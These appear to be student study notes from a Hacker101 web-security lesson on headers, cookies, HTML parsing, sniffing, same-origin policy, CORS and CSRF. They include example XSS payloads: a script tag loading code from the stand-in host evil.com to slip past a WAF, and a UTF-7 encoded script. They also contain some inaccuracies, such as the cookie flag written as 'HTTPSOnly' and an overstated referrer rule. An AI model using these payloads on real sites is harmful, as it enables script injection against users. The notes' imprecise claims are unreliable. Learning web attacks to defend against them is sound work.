# Hacker101 Sessions

## 02. The Web In Depth

#### Request Headers

__Referrer__: Normally, is the page that lead to the request being done. However, if the origin connection is HTTPS, referrer won't be passed to any other servers.  

__Authorization__: Most sites use a form of 'basic auth' for normal authorization pages. It normally takes the form of "Basic <base64'd username:password>".  

__Cookies__: Cookies are key-value pairs of data that come from the server and are stored in the client, normally for a fixed ammount of time. Each cookie has a domain pattern that must match. Each cookie must match the domain pattern. If it applies to a root domain, it applies to every subdomains. If you can set cookies in domains where you're not supposed to, is a breach of security.  

_i.e_:  

> Cookies added for ".foo.com" can be read in any subdomain of "foo.com"
>Cookies added for "bar.foo.com" will only apply to "bar.foo.com"
>A subdomain can set cookies for it's own children and parent, but never for sibiling domains. i.e: "bar.foo.com" can't set cookies on "bar2.foo.com", but can in "bar.foobar.foo.com" and in "foo.com".  

- Flags (indicated by the server):

--- Secure: Only accessible to HTTPS pages  
--- HTTPSOnly: The cookie cannot be read by Javascript code.  

#### HTML

__Parsing__:  HTML _should_ be parsed by the relevant spec, generally HTML5.
When talking about security, HTML won't be only parsed by the browser, but also by WAF and other filters. If a discrepancy exists betweent the parsing convention, a potential vulnerability might exist.  

--- Canonical Example:

When visiting ```http://foo.com/vuln?name=<script/xss%20src=http://evil.com/evil.js>``` and it generates:

```html
<html>
    <head>
        <title>Vuln name <script xss src=http://evil.com/evil.js></title>
    </head>
</html>
```
The WAF will see "script/xss" and let it through as it doesn't match parsing. Browser is prepared to treat the slash after the HTML as an empty space (it thinks it's a broken character), so it will just render an empty "xss" attribute in the script tag and let the src go through. Normally WAF parsers are not this dumb anymore.  


#### Content Sniffing

__MIME Sniffing__: The browser will often now only look at the Content-Type header that the server passes with a request, but also the contents of a page.  

> "If it looks enough like HTML, it'll be parsed as HTML"  

This led to IE 6/7 bugs where image and text image containing enough HTML tags would execute as HTML. (Not relevant to most users today, but still a thing in enterprises)-

--- i.e:

There's a site called ZuckBook that allows users to upload pictures. If a malicious user uploads an image that contains HTML and then links it to other users, HTML would be parsed in the victim's browser.   

That's why ZuckBook and other sites use a separate domain to host user media.  

__Encoding Sniffing__: 

There are sites like HackerNews that didn't specify an encoding for the HTML document, so it's up to the browser to apply heuristics to determine it. That's why sometimes it renders funky characters. 

> "If you are able to control the way the browser decodes text, yo may be able to alter the parsing"

An example is UTF-7 encoding, which can look like this:

```+ADw-script+AD4-alert('XSS');+ADw-/script+AD4-```  

This will go clean through HTML encoding, as there's no unsafe characters. What there is is unsafe UTF-7 characters, because older browsers will see this and switch the parsing over to UTF-7, rendering:  

```<script>alert('xss')</script>```  

...an allowing the attack to succeed.  

This can be a great way to bypass WAF's, as if they're looking for UTF-8, or ASCII and you send UTF-7 or UTF-32 characters, you get through the filter.  


_ALWAYS specify an encoding and be sure which encoding is the browser using when parsing_  


__Same-Origin Policy__: SOP is how the browser determines a number of security features, like what domains can you contact via AJAX requests, or the access to the DOM accross separate frames or windows.  

It's what's preventing Internet from havoc. Every time it's broken, something bad happens.  
_SOP is much more strict than cookies:_

-- Protocol must match - no crossing HTTP/S
-- Port numbers must match  
-- Domain names must be an exact match - no wildcarding or subdomain walking  

_SOP loosening:_

It's possible for developers to loosen the grip that SOP has on their communications.

-- Changing _document.domain_  
-- Using [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
-- Using CORS 

__CORS__:  

Cross-Origin Resource Sharing is still relatively new, and allows some risky situations.  

In essence, with misconfiguration, you're allowed to make requests outside of your origin (i.e from _foo.com_ to _bar.com_), so it's possible to pass to another server the receiving domain cookies, allowing attackers to potentially compromise logged-in users.  

__CSRF__:  

Cross-Site Request Forgery is when a attacker tricks a victim to access a site they control, which will submit data to the target site _as_ the victim. One of the most common vulnerabilities today (see _./README/CRSF_).  









